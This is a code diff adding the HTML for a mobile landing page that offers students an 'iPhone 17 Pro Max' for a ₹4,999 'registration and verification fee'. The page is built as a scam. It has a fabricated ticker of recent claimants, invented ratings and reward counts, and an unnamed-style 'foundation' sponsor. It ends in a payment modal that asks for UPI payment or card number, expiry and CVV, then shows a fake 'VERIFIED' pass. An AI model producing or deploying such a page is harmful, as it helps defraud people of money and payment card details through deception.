@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>iPhone 17 Pro Max — Exclusive Student Rewards</title>
+  <meta name="description" content="Exclusive Student Offer: Get the Sunset Gold iPhone 17 Pro Max for ₹4,999. Fast 3-step registration and instant digital verification pass.">
+  
+  <!-- Mobile PWA Meta Tags (Android & iOS) -->
+  <meta name="theme-color" content="#fffcf5">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+  <meta name="format-detection" content="telephone=no">
+
+  <!-- Google Fonts: Poppins & Montserrat -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700;800&family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <!-- Canvas Confetti -->
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body class="warm-champagne-theme">
+
+  <!-- Ambient Light Orbs for Background -->
+  <div class="bg-orb orb-1"></div>
+  <div class="bg-orb orb-2"></div>
+
+  <!-- Top Navigation Header -->
+  <header class="navbar">
+    <div class="nav-container">
+      <a href="#" class="brand-logo">
+        <div class="logo-badge">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+        </div>
+        <span class="logo-title">STUDENT <span class="logo-highlight">REWARDS</span></span>
+      </a>
+
+      <button id="openStatusBtn" class="btn-status-nav" aria-label="Check Registration Status">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="11" cy="11" r="8"></circle>
+          <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+        </svg>
+        <span>MY STATUS</span>
+      </button>
+    </div>
+  </header>
+
+  <!-- Social Proof Ticker -->
+  <div class="proof-ticker">
+    <div class="ticker-inner">
+      <span class="pulse-dot"></span>
+      <span id="tickerText">🔥 Rohan V. from Bengaluru claimed Sunset Gold iPhone 17 Pro Max (STU-892401) • 178/200 claimed today</span>
+    </div>
+  </div>
+
+  <main>
+    <!-- HERO SECTION -->
+    <section class="hero">
+      <div class="hero-wrapper">
+        
+        <div class="hero-tag">
+          <span class="tag-icon">✨</span>
+          <span>EXCLUSIVE STUDENT OFFER</span>
+        </div>
+
+        <h1 class="hero-title">
+          GET THE <span class="headline-gold">iPHONE 17 PRO MAX</span>
+        </h1>
+
+        <!-- Highlighted Pricing Box -->
+        <div class="hero-price-badge">
+          <div class="price-main">
+            <span class="price-symbol">₹</span>
+            <span class="price-value">4,999</span>
+          </div>
+          <div class="price-details">
+            <span class="price-old">MSRP ₹1,49,900</span>
+            <span class="price-off">96% OFF STUDENT INCENTIVE</span>
+          </div>
+        </div>
+
+        <p class="hero-subtitle">Special Sunset Gold Edition • Verified Student Reward Quota</p>
+
+        <!-- Product Image Showcase with Glowing Halo Ring -->
+        <div class="product-showcase">
+          <div class="halo-ring"></div>
+          <img src="assets/iphone17_hero_clean.png" alt="iPhone 17 Pro Max Sunset Gold Edition" class="product-img" id="iphoneImg">
+        </div>
+
+        <!-- Primary Call To Action -->
+        <div class="cta-container">
+          <button id="heroCtaBtn" class="btn-cta-primary">
+            <span>🔥 I'M INTERESTED — ₹4,999</span>
+            <div class="btn-shine"></div>
+          </button>
+          <p class="cta-subtext">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Limited Campaign • Terms Apply • Instant Digital Pass
+          </p>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- TRUST METRICS RIBBON -->
+    <section class="trust-bar">
+      <div class="trust-content">
+        <div class="trust-item">
+          <div class="trust-number">4.9 ★</div>
+          <div class="trust-label">Student Rating</div>
+        </div>
+        <div class="trust-divider"></div>
+        <div class="trust-item">
+          <div class="trust-number">18,920+</div>
+          <div class="trust-label">Rewards Allocated</div>
+        </div>
+        <div class="trust-divider"></div>
+        <div class="trust-item">
+          <div class="trust-number">Instant</div>
+          <div class="trust-label">Digital Pass</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- HOW IT WORKS -->
+    <section class="how-section" id="howItWorks">
+      <div class="container">
+        <div class="section-heading">
+          <span class="sub-tag">SIMPLE 3-STEP FLOW</span>
+          <h2>HOW IT WORKS</h2>
+          <p>Complete your registration in under 60 seconds</p>
+        </div>
+
+        <div class="steps-grid">
+          <div class="step-card">
+            <div class="step-badge">1</div>
+            <div class="step-icon">
+              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><polyline points="17 11 19 13 23 9"/></svg>
+            </div>
+            <h3>1. Quick Register</h3>
+            <p>Enter your Name, Mobile Number (+91), and City. No lengthy forms or student ID uploads at step one.</p>
+          </div>
+
+          <div class="step-card">
+            <div class="step-badge">2</div>
+            <div class="step-icon">
+              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+            </div>
+            <h3>2. Complete Payment</h3>
+            <p>Pay the ₹4,999 registration & verification fee securely via UPI (Google Pay, PhonePe, Paytm), QR Code, or Cards.</p>
+          </div>
+
+          <div class="step-card">
+            <div class="step-badge">3</div>
+            <div class="step-icon">
+              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+            </div>
+            <h3>3. Receive Confirmation</h3>
+            <p>Get your official Registration ID (STU-XXXXXX) instantly with digital pass and WhatsApp receipt.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CAMPAIGN DETAILS -->
+    <section class="details-section" id="campaignDetails">
+      <div class="container">
+        <div class="section-heading">
+          <span class="sub-tag">RULES & GOVERNANCE</span>
+          <h2>CAMPAIGN DETAILS</h2>
+        </div>
+
+        <div class="details-grid">
+          <div class="details-card">
+            <div class="card-head">
+              <span class="card-icon">🎓</span>
+              <h3>Eligibility</h3>
+            </div>
+            <ul>
+              <li>Open to active students enrolled in schools, colleges, or universities in India.</li>
+              <li>Valid Indian mobile number (+91) required for confirmation.</li>
+              <li>Limit of one iPhone 17 Pro Max registration per verified student.</li>
+            </ul>
+          </div>
+
+          <div class="details-card">
+            <div class="card-head">
+              <span class="card-icon">📜</span>
+              <h3>Terms & Conditions</h3>
+            </div>
+            <ul>
+              <li>The ₹4,999 payment covers campaign registration, student verification, and insured shipping.</li>
+              <li>Reward allocations are assigned on a first-come, first-served quota basis.</li>
+              <li>Digital Registration Pass issued immediately upon payment authorization.</li>
+            </ul>
+          </div>
+
+          <div class="details-card">
+            <div class="card-head">
+              <span class="card-icon">🏢</span>
+              <h3>Sponsor & Organizer</h3>
+            </div>
+            <ul>
+              <li>Organized by **Student Rewards India Foundation** in partner sponsor network.</li>
+              <li>256-bit SSL encrypted PCI-DSS compliant payment processing.</li>
+              <li>24/7 WhatsApp support desk for student verification assistance.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ SECTION -->
+    <section class="faq-section">
+      <div class="container">
+        <div class="section-heading">
+          <span class="sub-tag">QUESTIONS?</span>
+          <h2>FREQUENTLY ASKED QUESTIONS</h2>
+        </div>
+
+        <div class="faq-accordion">
+          <div class="faq-item">
+            <button class="faq-q">
+              <span>Why is the iPhone 17 Pro Max available for ₹4,999?</span>
+              <span class="faq-icon">+</span>
+            </button>
+            <div class="faq-a">
+              <p>This is a promotional student reward allocation campaign co-sponsored by partner institutions to empower youth with high-performance technology. The ₹4,999 fee covers administrative processing, verification, and insured delivery.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-q">
+              <span>What details are required to register?</span>
+              <span class="faq-icon">+</span>
+            </button>
+            <div class="faq-a">
+              <p>Stage one registration requires only your Name, Mobile Number (+91), and City. No student ID upload or long forms are requested until final dispatch confirmation.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-q">
+              <span>How do I receive my registration confirmation?</span>
+              <span class="faq-icon">+</span>
+            </button>
+            <div class="faq-a">
+              <p>Immediately after successful payment, a unique Registration ID (e.g. STU-284729) is generated on screen. You can view your Digital Pass directly on the site, download it, or receive confirmation via WhatsApp.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-q">
+              <span>What payment options are supported?</span>
+              <span class="faq-icon">+</span>
+            </button>
+            <div class="faq-a">
+              <p>We support all major Indian payment options: UPI (Google Pay, PhonePe, Paytm, BHIM), Credit/Debit Cards (Visa, MasterCard, RuPay), and Net Banking.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Sticky Mobile Bar -->
+  <div class="mobile-sticky-bar">
+    <div class="m-price-info">
+      <span class="m-label">Student Offer</span>
+      <span class="m-price">₹4,999</span>
+    </div>
+    <button id="mobileCtaBtn" class="btn-m-cta">
+      🔥 I'M INTERESTED
+    </button>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="site-footer">
+    <div class="footer-container">
+      <div class="footer-brand">
+        <span class="footer-logo">STUDENT <span class="logo-highlight">REWARDS</span></span>
+        <p>Empowering Indian Students with Premier Technology Access</p>
+      </div>
+
+      <div class="footer-nav">
+        <a href="#campaignDetails">Eligibility</a>
+        <a href="#campaignDetails">Terms & Conditions</a>
+        <a href="#campaignDetails">Privacy Policy</a>
+        <a href="#howItWorks">Contact Support</a>
+      </div>
+
+      <div class="footer-legal">
+        <p>© 2026 Student Rewards Campaign. All rights reserved. Independent student incentive reward campaign; not directly affiliated with Apple Inc.</p>
+      </div>
+    </div>
+  </footer>
+
+
+  <!-- MODAL 1: REGISTRATION POPUP -->
+  <div id="registrationModal" class="modal-overlay" aria-hidden="true">
+    <div class="modal-card">
+      <div class="mobile-drag-handle"></div>
+      <button class="close-btn" id="closeRegModal">&times;</button>
+      
+      <div class="modal-header">
+        <h2 class="modal-title">You're Interested! 🎉</h2>
+        <p class="modal-subtitle">Claim your ₹4,999 iPhone 17 Pro Max slot</p>
+      </div>
+
+      <form id="registrationForm" onsubmit="return false;">
+        <div class="form-group">
+          <label for="regName">Name</label>
+          <input type="text" id="regName" class="form-input" placeholder="Enter your name" required autocomplete="name">
+        </div>
+
+        <div class="form-group">
+          <label for="regMobile">Mobile Number</label>
+          <div class="input-mobile-box">
+            <span class="prefix">+91</span>
+            <input type="tel" id="regMobile" class="form-input input-phone" placeholder="XXXXX XXXXX" maxlength="10" required autocomplete="tel">
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="regCity">City</label>
+          <select id="regCity" class="form-input form-select" required>
+            <option value="" disabled selected>Select your city</option>
+            <option value="Mumbai">Mumbai</option>
+            <option value="Delhi NCR">Delhi NCR</option>
+            <option value="Bengaluru">Bengaluru</option>
+            <option value="Hyderabad">Hyderabad</option>
+            <option value="Chennai">Chennai</option>
+            <option value="Pune">Pune</option>
+            <option value="Kolkata">Kolkata</option>
+            <option value="Ahmedabad">Ahmedabad</option>
+            <option value="Jaipur">Jaipur</option>
+            <option value="Chandigarh">Chandigarh</option>
+            <option value="Other">Other City</option>
+          </select>
+        </div>
+
+        <div class="checkbox-group">
+          <input type="checkbox" id="regTerms" class="checkbox-input" required checked>
+          <label for="regTerms">
+            I agree to the <a href="#campaignDetails" target="_blank">Terms & Conditions</a>
+          </label>
+        </div>
+
+        <button type="submit" id="regSubmitBtn" class="btn-modal-primary">
+          CONTINUE
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+        </button>
+      </form>
+    </div>
+  </div>
+
+
+  <!-- MODAL 2: PAYMENT SCREEN -->
+  <div id="paymentModal" class="modal-overlay" aria-hidden="true">
+    <div class="modal-card">
+      <div class="mobile-drag-handle"></div>
+      <button class="close-btn" id="closePayModal">&times;</button>
+      
+      <div class="modal-header text-center">
+        <span class="security-badge">🔒 256-BIT SECURE PAYMENT</span>
+        <h2 class="modal-title">Complete Your Registration</h2>
+      </div>
+
+      <!-- Selected Offer Summary -->
+      <div class="summary-box">
+        <div class="summary-row">
+          <div class="item-info">
+            <span class="emoji">📱</span>
+            <div>
+              <div class="name">iPhone 17 Pro Max</div>
+              <div class="sub">Sunset Gold Edition</div>
+            </div>
+          </div>
+          <div class="price">₹4,999</div>
+        </div>
+        <div class="summary-divider"></div>
+        <div class="user-info">
+          <div class="info-line"><span>Name:</span> <strong id="paySummaryName">Chakradhar</strong></div>
+          <div class="info-line"><span>Mobile:</span> <strong id="paySummaryMobile">+91 XXXXX XXXXX</strong></div>
+        </div>
+      </div>
+
+      <!-- Payment Tabs -->
+      <div class="payment-tabs-wrapper">
+        <label class="pay-label">Select Payment Method</label>
+        <div class="pay-tabs">
+          <button class="pay-tab active" data-tab="upi">⚡ UPI Apps</button>
+          <button class="pay-tab" data-tab="qr">📷 QR Code</button>
+          <button class="pay-tab" data-tab="card">💳 Cards / NetBanking</button>
+        </div>
+
+        <!-- UPI Tab -->
+        <div class="tab-content active" id="tabUpi">
+          <div class="upi-grid">
+            <div class="upi-card selected" data-upi="gpay">
+              <span class="icon gpay">GPay</span>
+              <span>Google Pay</span>
+            </div>
+            <div class="upi-card" data-upi="phonepe">
+              <span class="icon phonepe">Pe</span>
+              <span>PhonePe</span>
+            </div>
+            <div class="upi-card" data-upi="paytm">
+              <span class="icon paytm">Paytm</span>
+              <span>Paytm</span>
+            </div>
+            <div class="upi-card" data-upi="bhim">
+              <span class="icon bhim">BHIM</span>
+              <span>BHIM UPI</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- QR Tab -->
+        <div class="tab-content" id="tabQr">
+          <div class="qr-box">
+            <div class="qr-code">
+              <svg width="100" height="100" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="1.5">
+                <rect x="3" y="3" width="7" height="7" rx="1"/>
+                <rect x="14" y="3" width="7" height="7" rx="1"/>
+                <rect x="3" y="14" width="7" height="7" rx="1"/>
+                <rect x="5" y="5" width="3" height="3" fill="#111"/>
+                <rect x="16" y="5" width="3" height="3" fill="#111"/>
+                <rect x="5" y="16" width="3" height="3" fill="#111"/>
+                <path d="M14 14h3v3h-3z" fill="#111"/>
+                <path d="M18 18h3v3h-3z" fill="#111"/>
+              </svg>
+            </div>
+            <p>Scan with any UPI App to pay ₹4,999</p>
+          </div>
+        </div>
+
+        <!-- Card Tab -->
+        <div class="tab-content" id="tabCard">
+          <div class="card-form">
+            <input type="text" class="form-input" placeholder="Card Number (4532 •••• •••• ••••)">
+            <div class="row">
+              <input type="text" class="form-input" placeholder="MM/YY">
+              <input type="password" class="form-input" placeholder="CVV" maxlength="3">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Legal Disclosure -->
+      <div class="legal-purpose">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+        <span>Payment Purpose: Official Student iPhone Reward Campaign registration processing, identity verification, and insured allotment dispatch.</span>
+      </div>
+
+      <button id="paySubmitBtn" class="btn-pay-action">
+        <span id="payBtnText">PAY ₹4,999</span>
+        <div id="payLoader" class="spinner hidden"></div>
+      </button>
+    </div>
+  </div>
+
+
+  <!-- MODAL 3: PAYMENT SUCCESS SCREEN -->
+  <div id="successModal" class="modal-overlay" aria-hidden="true">
+    <div class="modal-card text-center">
+      <div class="mobile-drag-handle"></div>
+      <div class="success-icon">
+        <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+          <polyline points="22 4 12 14.01 9 11.01"/></svg>
+      </div>
+
+      <h2 class="modal-title">🎉 Registration Successful!</h2>
+      <p class="modal-subtitle">Your iPhone 17 Pro Max reward allocation is confirmed.</p>
+
+      <div class="digital-ticket">
+        <div class="ticket-top">
+          <span>OFFICIAL DIGITAL PASS</span>
+          <span class="status-badge">VERIFIED</span>
+        </div>
+        <div class="ticket-grid">
+          <div class="field"><span class="lbl">Registration ID</span><span class="val highlight" id="successRegId">STU-284729</span></div>
+          <div class="field"><span class="lbl">Campaign</span><span class="val">iPhone 17 Pro Max</span></div>
+          <div class="field"><span class="lbl">Name</span><span class="val" id="successName">Chakradhar</span></div>
+          <div class="field"><span class="lbl">Amount</span><span class="val green">₹4,999 (Confirmed)</span></div>
+        </div>
+      </div>
+
+      <p class="success-msg">
+        Confirmation receipt sent to registered mobile <strong id="successMobile">+91 XXXXX XXXXX</strong>.
+      </p>
+
+      <div class="action-buttons">
+        <button id="viewRegistrationBtn" class="btn-modal-primary">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+          VIEW MY REGISTRATION
+        </button>
+        <button id="whatsappBtn" class="btn-whatsapp">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.893 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.893 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981z"/></svg>
+          WHATSAPP CONFIRMATION
+        </button>
+      </div>
+
+      <div class="margin-top-sm">
+        <button id="closeSuccessBtn" class="link-subtle">Close Window</button>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- MODAL 4: CHECK REGISTRATION STATUS -->
+  <div id="statusModal" class="modal-overlay" aria-hidden="true">
+    <div class="modal-card">
+      <div class="mobile-drag-handle"></div>
+      <button class="close-btn" id="closeStatusModal">&times;</button>
+      
+      <div class="modal-header text-center">
+        <h2 class="modal-title">Check Registration Status</h2>
+        <p class="modal-subtitle">Enter your Mobile Number or STU Registration ID</p>
+      </div>
+
+      <form id="statusSearchForm" onsubmit="return false;">
+        <div class="form-group">
+          <label for="statusQueryInput">Mobile Number / Registration ID</label>
+          <input type="text" id="statusQueryInput" class="form-input" placeholder="e.g. STU-284729 or 9876543210" required>
+        </div>
+        <button type="submit" id="statusSearchBtn" class="btn-modal-primary">
+          SEARCH REGISTRATION
+        </button>
+      </form>
+
+      <div id="statusResultContainer" class="status-result-box hidden"></div>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
